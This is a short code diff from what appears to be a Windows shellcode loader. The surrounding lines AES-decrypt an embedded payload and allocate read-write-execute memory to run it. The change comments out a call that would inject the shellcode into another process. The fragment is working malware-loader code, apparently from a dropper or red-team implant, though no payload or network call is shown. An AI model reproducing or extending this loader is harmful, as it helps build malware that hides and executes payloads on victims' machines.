@@ -241,7 +241,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine,
     payload = aes.DecryptCBC(payload, key, iv);
 
     // Run in current process is a failsafe
-    if (InjectShellcodeToAny(&payload[0], dwSize)) return 0;
+    // if (InjectShellcodeToAny(&payload[0], dwSize)) return 0;
 
     // Allocate memory
     void* lpMem = fVirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
